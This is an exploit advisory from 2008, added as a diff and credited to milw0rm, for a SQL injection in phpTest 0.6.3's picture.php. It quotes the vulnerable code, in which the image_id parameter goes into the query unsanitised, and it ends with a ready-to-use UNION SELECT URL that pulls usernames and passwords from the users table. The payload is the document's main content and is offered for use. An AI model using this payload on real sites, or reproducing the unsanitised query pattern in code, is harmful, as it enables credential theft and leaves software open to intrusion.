@@ -1,0 +1,33 @@
+########################################################################################
+#
+#   Name   : phpTest 0.6.3 (picture.php image_id) Remote SQL Injection Vulnerability
+#   Author : cOndemned [ Dark-Coders ]
+#   Dork   : sorry, today no dork [;
+#   Greetz : ZaBeaTy, str0ke, GregStar, Voo|doo, ixos, 0in, suN8Hclf, TBH, Avantura :*
+#
+########################################################################################
+
+Source code of "picture.php" :
+
+    24.    pt_register('GET', 'image_id');
+    25.
+    26.    if (isset($image_id)) {
+    27.        $result = $db->query("SELECT filetype, data FROM images WHERE image_id = $image_id");
+    28.
+    29.        if ($db->num_rows($result)) {
+    30.            $row = $db->fetch_object($result);
+    31.            header("Content-type: $row->filetype");
+    32.            echo $row->data;
+
+Description :
+
+    line 24 - $image_id is taken from user using $_GET method
+    line 27 - There is absolutly no validation of $image_id + We can se amount of columns - 2
+    line 31 - header type doesn't matter....
+    line 32 - Result of MySQL Query is being printed here.
+        
+Exploit :
+
+    http://[host]/[phpTest]/picture.php?image_id=-1+union+select+1,concat_ws(0x3a3a,username,password)+from+users/*
+
+# milw0rm.com [2008-07-25]
